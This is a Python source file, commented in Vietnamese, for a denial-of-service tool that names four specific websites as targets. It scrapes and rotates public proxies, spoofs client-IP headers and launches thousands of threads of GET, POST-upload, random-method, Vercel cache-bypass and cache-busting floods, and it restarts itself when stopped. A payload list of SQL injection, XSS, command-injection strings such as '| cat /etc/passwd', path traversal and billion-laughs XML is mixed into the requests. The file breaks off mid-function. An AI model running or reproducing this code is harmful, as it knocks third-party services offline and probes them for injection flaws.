# -*- coding: utf-8 -*-
# TOOL DDoS SIÊU MẠNH - ĐA METHOD - ĐA MỤC TIÊU - VERCEL KILLER - AUTO RESTART
# Mục tiêu: t4xcheatgamer.x10.mx + cshellvn.vercel.app + darkmatterbin.unaux.com + getkey.liveblog365.com
# Tác giả: palofsc
# Phiên bản: 6.0 TERMINATOR

import requests
import threading
import queue
import time
import random
import socket
import ssl
import sys
import os
import re
import signal
import urllib3
import string
import hashlib
import json
import base64
import gzip
import zlib
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode
import warnings
warnings.filterwarnings('ignore')
urllib3.disable_warnings()

# ============================================
# CẤU HÌNH CHUNG
# ============================================
TARGET_HOSTS = [
    "www.t4xcheatgamer.x10.mx",
    "cshellvn.vercel.app",
    "darkmatterbin.unaux.com",
    "getkey.liveblog365.com",
]
TARGET_PORT = 443

# TOÀN BỘ MỤC TIÊU - 4 DOMAIN
TARGET_URLS = [
    # Domain 1: x10.mx
    "https://www.t4xcheatgamer.x10.mx/dll_download.php",
    "https://www.t4xcheatgamer.x10.mx/login.php",
    "https://www.t4xcheatgamer.x10.mx/dll_status.php",
    "https://www.t4xcheatgamer.x10.mx/index.php",
    "https://www.t4xcheatgamer.x10.mx/download.php",
    "https://www.t4xcheatgamer.x10.mx/admin/",
    "https://www.t4xcheatgamer.x10.mx/wp-admin/",
    "https://www.t4xcheatgamer.x10.mx/wp-login.php",
    "https://www.t4xcheatgamer.x10.mx/xmlrpc.php",
    "https://www.t4xcheatgamer.x10.mx/.env",
    "https://www.t4xcheatgamer.x10.mx/phpinfo.php",
    # Domain 2: vercel.app
    "https://cshellvn.vercel.app/getkey",
    "https://cshellvn.vercel.app/index.html",
    "https://cshellvn.vercel.app/download",
    "https://cshellvn.vercel.app/api/",
    "https://cshellvn.vercel.app/_next/",
    "https://cshellvn.vercel.app/static/",
    "https://cshellvn.vercel.app/favicon.ico",
    "https://cshellvn.vercel.app/robots.txt",
    "https://cshellvn.vercel.app/sitemap.xml",
    "https://cshellvn.vercel.app/api/auth",
    "https://cshellvn.vercel.app/api/user",
    "https://cshellvn.vercel.app/api/data",
    "https://cshellvn.vercel.app/__nextjs_original-stack-frame",
    # Domain 3: unaux.com
    "https://darkmatterbin.unaux.com/",
    "https://darkmatterbin.unaux.com/index.php",
    "https://darkmatterbin.unaux.com/login.php",
    "https://darkmatterbin.unaux.com/download.php",
    "https://darkmatterbin.unaux.com/admin/",
    "https://darkmatterbin.unaux.com/wp-admin/",
    "https://darkmatterbin.unaux.com/wp-login.php",
    "https://darkmatterbin.unaux.com/xmlrpc.php",
    "https://darkmatterbin.unaux.com/.env",
    "https://darkmatterbin.unaux.com/phpinfo.php",
    "https://darkmatterbin.unaux.com/api/",
    "https://darkmatterbin.unaux.com/upload.php",
    # Domain 4: liveblog365.com
    "https://getkey.liveblog365.com/",
    "https://getkey.liveblog365.com/index.php",
    "https://getkey.liveblog365.com/login.php",
    "https://getkey.liveblog365.com/download.php",
    "https://getkey.liveblog365.com/admin/",
    "https://getkey.liveblog365.com/wp-admin/",
    "https://getkey.liveblog365.com/wp-login.php",
    "https://getkey.liveblog365.com/xmlrpc.php",
    "https://getkey.liveblog365.com/.env",
    "https://getkey.liveblog365.com/phpinfo.php",
    "https://getkey.liveblog365.com/api/",
    "https://getkey.liveblog365.com/getkey",
]

TARGET_PATHS = [
    "/", "/index.php", "/index.html", "/login.php", "/download.php", "/dll_download.php",
    "/dll_status.php", "/getkey", "/download", "/api/", "/admin/", "/wp-admin/",
    "/wp-login.php", "/xmlrpc.php", "/.env", "/.git/config", "/phpinfo.php",
    "/info.php", "/test.php", "/status.php", "/server-status", "/server-info",
    "/_next/", "/static/", "/favicon.ico", "/robots.txt", "/sitemap.xml",
    "/api/auth", "/api/user", "/api/data", "/api/config", "/upload.php",
    "/backup/", "/wp-content/", "/wp-includes/", "/wp-json/",
]

# File lưu proxy
PROXY_FILE = "proxies_raw.txt"
PROXY_LIVE_FILE = "proxies_live.txt"

current_proxy_manager = None
AUTO_RESTART = True  # Tự động khởi động lại khi bị terminated

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=https",
    "https://spys.me/proxy.txt",
    "https://free-proxy-list.net/",
    "https://www.sslproxies.org/",
    "https://www.us-proxy.org/",
    "https://www.socks-proxy.net/",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
]

PROXY_CHECK_TIMEOUT = 2
PROXY_CHECK_THREADS = 500
MAX_RETRIES = 1
SAVE_INTERVAL = 500

TEST_URLS = [
    "http://httpbin.org/ip",
    "https://api.ipify.org?format=json",
    "http://ip-api.com/json/",
]

# Tham số DDoS - TUYỆT ĐỈNH
HTTP_FLOOD_THREADS = 5000
SLOWLORIS_THREADS = 1000
POST_FLOOD_THREADS = 3000
RANDOM_METHOD_THREADS = 3000
VERCEL_BYPASS_THREADS = 3000
CACHE_BYPASS_THREADS = 3000
TCP_SYN_FLOOD = True  # Bật TCP SYN Flood tự động
TOTAL_THREADS = HTTP_FLOOD_THREADS + SLOWLORIS_THREADS + POST_FLOOD_THREADS + RANDOM_METHOD_THREADS + VERCEL_BYPASS_THREADS + CACHE_BYPASS_THREADS
DDOS_DELAY = 0
ROTATE_PROXY_EVERY = 1

HTTP_METHODS = [
    "GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH", "TRACE", "CONNECT",
    "PURGE", "DEBUG", "TRACK", "LOCK", "UNLOCK", "PROPFIND", "PROPPATCH", "MKCOL",
    "COPY", "MOVE", "SEARCH", "BIND", "UNBIND", "REBIND", "LABEL", "LINK", "UNLINK",
    "MERGE", "BASELINE", "CHECKIN", "CHECKOUT", "UNCHECKOUT", "VERSION-CONTROL",
    "REPORT", "UPDATE", "REDIRECT", "FOOBAR", "RANDOM123", "NULL", "FAKE",
    "BREW", "WHEN", "UNBREW", "POST2GET", "GET2POST",
]

CONTENT_TYPES = [
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "application/json",
    "application/xml",
    "text/xml",
    "text/plain",
    "text/html",
    "application/octet-stream",
    "application/x-httpd-php",
    "application/pdf",
    "image/jpeg",
    "image/png",
    "image/gif",
    "video/mp4",
    "audio/mpeg",
    "application/zip",
    "application/gzip",
    "application/x-tar",
    "application/x-7z-compressed",
    "application/x-rar-compressed",
    "application/x-shockwave-flash",
    "application/vnd.ms-excel",
    "application/vnd.ms-powerpoint",
    "application/msword",
    "application/java-archive",
    "application/x-msdownload",
    "application/x-python-code",
    "application/x-perl",
    "application/x-ruby",
    "application/x-php",
    "application/x-javascript",
    "text/css",
    "text/csv",
    "application/x-yaml",
]

QUERY_PARAMS_POOL = [
    "download", "file_id", "id", "action", "mode", "type", "token", "key", "hash",
    "checksum", "version", "user", "pass", "username", "password", "login", "email",
    "admin", "root", "debug", "test", "page", "sort", "order", "limit", "offset",
    "search", "q", "query", "cmd", "exec", "command", "shell", "eval", "include",
    "require", "file", "path", "dir", "folder", "url", "redirect", "return", "next",
    "callback", "jsonp", "format", "output", "api_key", "apikey", "auth", "session",
    "cookie", "csrf", "nonce", "timestamp", "time", "date", "rand", "random",
    "_vercel_no_cache", "_rsc", "_next", "buildId",
]

PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "admin'--", "1' OR '1'='1'--",
    "1; DROP TABLE users--", "' UNION SELECT * FROM users--",
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "javascript:alert(1)", "<svg/onload=alert(1)>",
    "; ls -la", "| cat /etc/passwd", "`id`", "$(whoami)",
    "../../../etc/passwd", "..\\..\\..\\windows\\system32",
    ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(50, 500))),
    "\x00" * random.randint(100, 1000),
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">]><lolz>&lol2;</lolz>',
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "facebookexternalhit/1.1",
    "curl/7.68.0",
    "python-requests/2.31.0",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
]

REFERERS = [
    "https://www.google.com/search?q=cheat+game+download",
    "https://www.bing.com/search?q=free+game+cheats",
    "https://www.reddit.com/r/cheats/",
    "https://www.youtube.com/watch?v=cheat_tutorial",
    "https://www.facebook.com/groups/gamecheats/",
    "https://discord.com/channels/gamecheats/",
    "https://t.me/gamecheats",
    "https://github.com/gamecheats/",
    "https://twitter.com/cheatgamer",
    "https://www.tiktok.com/@cheatgamer",
    "",
]

# ============================================
# HÀM TỰ ĐỘNG KHỞI ĐỘNG LẠI KHI BỊ TERMINATED
# ============================================
def auto_restart_handler():
    """Ghi script restart và thoát"""
    restart_script = '''#!/bin/bash
cd "$(dirname "$0")"
python3 "$(basename "$0")"
'''
    with open("restart.sh", "w") as f:
        f.write(restart_script)
    os.chmod("restart.sh", 0o755)

def signal_handler(signum, frame):
    global current_proxy_manager
    print("\n\n[!] ĐÃ NHẬN TÍN HIỆU DỪNG - ĐANG LƯU PROXY LIVE...")
    if current_proxy_manager and current_proxy_manager.live_proxies:
        try:
            with open(PROXY_LIVE_FILE, "w") as f:
                for proxy in current_proxy_manager.live_proxies:
                    f.write(proxy + "\n")
            print(f"[+] ĐÃ LƯU {len(current_proxy_manager.live_proxies)} PROXY LIVE VÀO {PROXY_LIVE_FILE}")
        except Exception as e:
            print(f"[-] LỖI KHI LƯU FILE: {str(e)}")
    
    if AUTO_RESTART:
        print("[!] AUTO RESTART: Đang khởi động lại tool...")
        try:
            subprocess.Popen([sys.executable] + sys.argv, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    
    print("[!] Thoát...\n")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ============================================
# LỚP QUẢN LÝ PROXY
# ============================================
class ProxyManager:
    def __init__(self):
        self.proxy_queue = queue.Queue()
        self.live_proxies = []
        self.lock = threading.Lock()
        self.total_scanned = 0
        self.total_live = 0
        
    def fetch_proxies_from_source(self, url):
        proxies = []
        try:
            response = requests.get(url, timeout=15, headers={"User-Agent": random.choice(USER_AGENTS)})
            content = response.text
            ip_port_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b')
            matches = ip_port_pattern.findall(content)
            for match in matches:
                proxies.append(match.strip())
            print(f"[+] Đã quét {url}: tìm thấy {len(matches)} proxy")
        except:
            pass
        return proxies
    
    def scan_all_sources(self):
        print("\n" + "="*60)
        print("[*] BẮT ĐẦU QUÉT PROXY TỪ CÁC NGUỒN...")
        print("="*60 + "\n")
        all_proxies = set()
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(self.fetch_proxies_from_source, url): url for url in PROXY_SOURCES}
            for future in as_completed(futures):
                result = future.result()
                all_proxies.update(result)
        with open(PROXY_FILE, "w") as f:
            for proxy in all_proxies:
                f.write(proxy + "\n")
        print(f"\n[+] TỔNG CỘNG: {len(all_proxies)} proxy thô đã được lưu vào {PROXY_FILE}")
        return list(all_proxies)
    
    def check_proxy(self, proxy):
        proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        for test_url in TEST_URLS:
            try:
                response = requests.get(test_url, proxies=proxy_dict, timeout=PROXY_CHECK_TIMEOUT,
                                        headers={"User-Agent": random.choice(USER_AGENTS)}, verify=False)
                if response.status_code == 200:
                    return True, proxy
            except:
                continue
        return False, proxy
    
    def check_all_proxies(self, proxy_list):
        global current_proxy_manager
        current_proxy_manager = self
        print("\n" + "="*60)
        print(f"[*] BẮT ĐẦU KIỂM TRA {len(proxy_list)} PROXY...")
        print("="*60 + "\n")
        live_proxies = []
        self.total_scanned = len(proxy_list)
        checked = 0
        with ThreadPoolExecutor(max_workers=PROXY_CHECK_THREADS) as executor:
            futures = {executor.submit(self.check_proxy, proxy): proxy for proxy in proxy_list}
            for future in as_completed(futures):
                try:
                    is_live, proxy = future.result(timeout=PROXY_CHECK_TIMEOUT + 2)
                except:
                    is_live, proxy = False, ""
                checked += 1
                if is_live:
                    live_proxies.append(proxy)
                    with self.lock:
                        self.total_live += 1
                if checked % 1000 == 0 or checked == self.total_scanned:
                    print(f"\r[*] Tiến độ: {checked}/{self.total_scanned} | Live: {self.total_live} | Tỉ lệ: {self.total_live/checked*100:.1f}%", end="")
                if checked % SAVE_INTERVAL == 0:
                    with open(PROXY_LIVE_FILE, "w") as f:
                        for p in live_proxies:
                            f.write(p + "\n")
                    print(f"\n[!] Đã tự động lưu {len(live_proxies)} proxy vào {PROXY_LIVE_FILE}")
        with open(PROXY_LIVE_FILE, "w") as f:
            for proxy in live_proxies:
                f.write(proxy + "\n")
        self.live_proxies = live_proxies
        print(f"\n\n[+] ĐÃ KIỂM TRA XONG: {len(live_proxies)} proxy live đã được lưu vào {PROXY_LIVE_FILE}")
        return live_proxies
    
    def get_random_proxy(self):
        if not self.live_proxies:
            return None
        proxy = random.choice(self.live_proxies)
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    
    def reload_live_proxies(self):
        if os.path.exists(PROXY_LIVE_FILE):
            with open(PROXY_LIVE_FILE, "r") as f:
                self.live_proxies = [line.strip() for line in f if line.strip()]
            print(f"[+] Đã tải {len(self.live_proxies)} proxy live từ file")
            return self.live_proxies
        return []

# ============================================
# LỚP SIÊU TẤN CÔNG ĐA METHOD
# ============================================
class UltraDDoSAttack:
    def __init__(self, proxy_manager):
        self.proxy_manager = proxy_manager
        self.total_requests = 0
        self.total_success = 0
        self.total_fail = 0
        self.lock = threading.Lock()
        self.running = False
        
    def generate_random_url(self):
        base_url = random.choice(TARGET_URLS)
        if random.random() < 0.3:
            host = random.choice(TARGET_HOSTS)
            base_url = f"https://{host}{random.choice(TARGET_PATHS)}"
        num_params = random.randint(1, 20)
        params = {}
        for _ in range(num_params):
            key = random.choice(QUERY_PARAMS_POOL)
            value = random.choice(PAYLOADS) if random.random() < 0.3 else hashlib.md5(os.urandom(16)).hexdigest()
            params[key] = value
        if params:
            base_url += "?" + urlencode(params)
        if random.random() < 0.2:
            base_url += "#" + hashlib.sha256(os.urandom(32)).hexdigest()[:20]
        return base_url
    
    def generate_ultra_headers(self):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "application/json,text/html,*/*", "*/*"]),
            "Accept-Language": random.choice(["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "*"]),
            "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "identity"]),
            "Referer": random.choice(REFERERS),
            "Connection": random.choice(["keep-alive", "close", "Keep-Alive"]),
            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store", "must-revalidate"]),
            "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
            "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
            "X-Client-IP": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
            "X-Forwarded-Host": random.choice(TARGET_HOSTS),
            "X-Host": random.choice(TARGET_HOSTS),
            "Content-Type": random.choice(CONTENT_TYPES),
            "X-Request-ID": hashlib.md5(os.urandom(16)).hexdigest(),
            "X-Trace-ID": ''.join(random.choices(string.hexdigits, k=32)),
        }
        for _ in range(random.randint(0, 15)):
            headers[f"X-Random-{random.randint(1, 99999)}"] = os.urandom(random.randint(100, 3000)).hex()
        return headers
    
    def generate_random_body(self):
        body_type = random.choice(["urlencoded", "json", "multipart", "xml", "raw", "empty", "large_raw"])
        if body_type == "urlencoded":
            params = {}
            for _ in range(random.randint(1, 30)):
                params[random.choice(QUERY_PARAMS_POOL)] = random.choice(PAYLOADS)
            return urlencode(params)
        elif body_type == "json":
            data = {}
            for _ in range(random.randint(1, 15)):
                data[random.choice(QUERY_PARAMS_POOL)] = random.choice(PAYLOADS)
            return json.dumps(data)
        elif body_type == "xml":
            return '<?xml version="1.0"?><root>' + ''.join([f'<{random.choice(QUERY_PARAMS_POOL)}>{random.choice(PAYLOADS)}</{random.choice(QUERY_PARAMS_POOL)}>' for _ in range(random.randint(1, 15))]) + '</root>'
        elif body_type == "multipart":
            boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            parts = []
            for _ in range(random.randint(1, 8)):
                parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{random.choice(QUERY_PARAMS_POOL)}\"\r\n\r\n{random.choice(PAYLOADS)}\r\n")
            parts.append(f"--{boundary}--\r\n")
            return "\r\n".join(parts)
        elif body_type in ["raw", "large_raw"]:
            size = random.randint(1024*500, 1024*1024*5) if body_type == "large_raw" else random.randint(1024, 1024*500)
            return os.urandom(size)
        else:
            return None
    
    def send_mega_request(self, thread_id):
        session = requests.Session()
        request_counter = 0
        while self.running:
            try:
                if request_counter % ROTATE_PROXY_EVERY == 0:
                    proxy = self.proxy_manager.get_random_proxy()
                url = self.generate_random_url()
                method = random.choice(HTTP_METHODS)
                headers = self.generate_ultra_headers()
                body = self.generate_random_body()
                
                if method in ["GET", "HEAD", "OPTIONS", "DELETE", "TRACE"]:
                    response = session.request(method, url, headers=headers, proxies=proxy, timeout=10, verify=False, stream=True)
                else:
                    response = session.request(method, url, headers=headers, data=body, proxies=proxy, timeout=10, verify=False, stream=True)
                
                try:
                    chunk = response.content[:4096]
                except:
                    pass
                
                with self.lock:
                    self.total_requests += 1
                    self.total_success += 1
                    if self.total_requests % 2000 == 0:
                        print(f"\r[*] ULTRA: {self.total_requests} req | OK: {self.total_success} | FAIL: {self.total_fail} | Proxy: {len(self.proxy_manager.live_proxies)}", end="")
                request_counter += 1
            except:
                with self.lock:
                    self.total_fail += 1
                    self.total_requests += 1
                request_counter += 1
                continue
    
    def start_mega_attack(self, num_threads=RANDOM_METHOD_THREADS):
        self.running = True
        print(f"\n[*] ULTRA ATTACK: {num_threads} luồng | {len(HTTP_METHODS)} Methods")
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.send_mega_request, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            if i % 500 == 0:
                time.sleep(0.005)
        return threads
    
    def stop_attack(self):
        self.running = False

# ============================================
# LỚP HTTP FLOOD
# ============================================
class HTTPFlood:
    def __init__(self, proxy_manager):
        self.proxy_manager = proxy_manager
        self.request_count = 0
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()
        self.running = False
        
    def send_request(self, thread_id):
        session = requests.Session()
        request_counter = 0
        while self.running:
            try:
                if request_counter % ROTATE_PROXY_EVERY == 0:
                    proxy = self.proxy_manager.get_random_proxy()
                target = random.choice(TARGET_URLS)
                # Thêm cache buster
                cache_buster = f"?_={random.randint(100000000, 999999999)}&{hashlib.md5(os.urandom(16)).hexdigest()}={random.randint(1,99999)}"
                url = target + cache_buster
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Referer": random.choice(REFERERS),
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache, no-store",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                }
                response = session.get(url, headers=headers, proxies=proxy, timeout=10, verify=False, stream=True)
                chunk = response.content[:4096]
                with self.lock:
                    self.request_count += 1
                    self.success_count += 1
                    if self.request_count % 2000 == 0:
                        print(f"\r[*] HTTP GET: {self.request_count} req | OK: {self.success_count} | FAIL: {self.fail_count}", end="")
                request_counter += 1
            except:
                with self.lock:
                    self.fail_count += 1
                request_counter += 1
                continue
    
    def start_flood(self, num_threads=HTTP_FLOOD_THREADS):
        self.running = True
        print(f"\n[*] HTTP GET FLOOD: {num_threads} luồng...")
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.send_request, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            if i % 500 == 0:
                time.sleep(0.005)
        return threads
    
    def stop_flood(self):
        self.running = False

# ============================================
# LỚP POST FLOOD
# ============================================
class PostFlood:
    def __init__(self, proxy_manager):
        self.proxy_manager = proxy_manager
        self.request_count = 0
        self.lock = threading.Lock()
        self.running = False
    
    def send_post_flood(self, thread_id):
        while self.running:
            try:
                proxy = self.proxy_manager.get_random_proxy()
                target = random.choice(TARGET_URLS)
                # Upload file rác 1MB-10MB
                fake_file = os.urandom(random.randint(1024*1024, 1024*1024*10))
                files = {"file": (f"payload_{random.randint(1,99999)}.bin", fake_file, "application/octet-stream")}
                data = {}
                for _ in range(random.randint(5, 20)):
                    data[random.choice(QUERY_PARAMS_POOL)] = hashlib.md5(os.urandom(16)).hexdigest()
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "Content-Type": "multipart/form-data",
                }
                response = requests.post(target, files=files, data=data, headers=headers, proxies=proxy, timeout=120, verify=False)
                with self.lock:
                    self.request_count += 1
                    if self.request_count % 200 == 0:
                        print(f"\r[*] POST UPLOAD: {self.request_count} files | Proxy: {len(self.proxy_manager.live_proxies)}", end="")
            except:
                pass
    
    def start_flood(self, num_threads=POST_FLOOD_THREADS):
        self.running = True
        print(f"\n[*] POST FLOOD (UPLOAD FILE RÁC 1-10MB): {num_threads} luồng...")
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.send_post_flood, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            if i % 200 == 0:
                time.sleep(0.01)
        return threads
    
    def stop_flood(self):
        self.running = False

# ============================================
# LỚP VERCEL BYPASS - ĐÁNH VÀO EDGE CACHE
# ============================================
class VercelBypass:
    def __init__(self, proxy_manager):
        self.proxy_manager = proxy_manager
        self.request_count = 0
        self.lock = threading.Lock()
        self.running = False
    
    def send_vercel_bypass(self, thread_id):
        while self.running:
            try:
                proxy = self.proxy_manager.get_random_proxy()
                # Chọn target bất kỳ, ưu tiên vercel
                targets = [u for u in TARGET_URLS if "vercel.app" in u]
                if not targets:
                    targets = TARGET_URLS
                target = random.choice(targets)
                
                # Cache buster mạnh
                params = {
                    "_vercel_no_cache": random.randint(100000000, 999999999),
                    "_rsc": random.choice(["1", "0", "true", "false"]),
                    "_next": random.randint(100000, 999999),
                    "buildId": hashlib.md5(os.urandom(16)).hexdigest(),
                    "ts": int(time.time() * 1000),
                    "rand": hashlib.sha256(os.urandom(32)).hexdigest(),
                }
                for _ in range(random.randint(5, 15)):
                    params[hashlib.md5(os.urandom(8)).hexdigest()[:8]] = hashlib.md5(os.urandom(16)).hexdigest()
                
                url = target + "?" + urlencode(params)
                
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "text/x-component,text/html,*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Referer": f"https://{random.choice(TARGET_HOSTS)}/",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "X-Vercel-Id": hashlib.md5(os.urandom(16)).hexdigest(),
                    "X-Vercel-Cache": "BYPASS",
                    "X-Vercel-Skip-Cache": "1",
                    "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
                    "Pragma": "no-cache",
                    "CDN-Cache-Control": "no-cache",
                    "Surrogate-Control": "no-store",
                    "X-Edge-Request-Id": hashlib.sha256(os.urandom(32)).hexdigest(),
                    "True-Client-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "CF-Connecting-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                }
                
                method = random.choice(["GET", "POST", "HEAD", "OPTIONS", "PATCH", "PUT", "DELETE"])
                if method in ["POST", "PUT", "PATCH"]:
                    body = os.urandom(random.randint(1024, 1024*500))
                    response = requests.request(method, url, headers=headers, data=body, proxies=proxy, timeout=10, verify=False)
                else:
                    response = requests.request(method, url, headers=headers, proxies=proxy, timeout=10, verify=False, stream=True)
                    try:
                        chunk = response.content[:4096]
                    except:
                        pass
                
                with self.lock:
                    self.request_count += 1
                    if self.request_count % 1000 == 0:
                        print(f"\r[*] VERCEL BYPASS: {self.request_count} req | Proxy: {len(self.proxy_manager.live_proxies)}", end="")
            except:
                pass
    
    def start_attack(self, num_threads=VERCEL_BYPASS_THREADS):
        self.running = True
        print(f"\n[*] VERCEL BYPASS: {num_threads} luồng (phá Edge Cache)...")
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.send_vercel_bypass, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            if i % 500 == 0:
                time.sleep(0.005)
        return threads
    
    def stop_attack(self):
        self.running = False

# ============================================
# LỚP CACHE BUSTER - TẤN CÔNG VÀO CACHE SERVER
# ============================================
class CacheBuster:
    def __init__(self, proxy_manager):
        self.proxy_manager = proxy_manager
        self.request_count = 0
        self.lock = threading.Lock()
        self.running = False
    
    def send_cache_buster(self, thread_id):
        while self.running:
            try:
                proxy = self.proxy_manager.get_random_proxy()
                target = random.choice(TARGET_URLS)
                
                # Tạo URL duy nhất tuyệt đối
                unique_params = {}
                for _ in range(random.randint(10, 40)):
                    param_name = ''.join(random.choices(string.ascii_letters, k=random.randint(5, 20)))
                    param_value = hashlib.sha256(os.urandom(32)).hexdigest()
                    unique_params[param_name] = param_value
                
                url = target + "?" + urlencode(unique_params)
                
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "*/*",
                    "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
                    "Pragma": "no-cache",
                    "Expires": "Thu, 01 Jan 1970 00:00:00 GMT",
                    "Surrogate-Control": "no-store, max-age=0",
                    "CDN-Cache-Control": "no-cache, max-age=0",
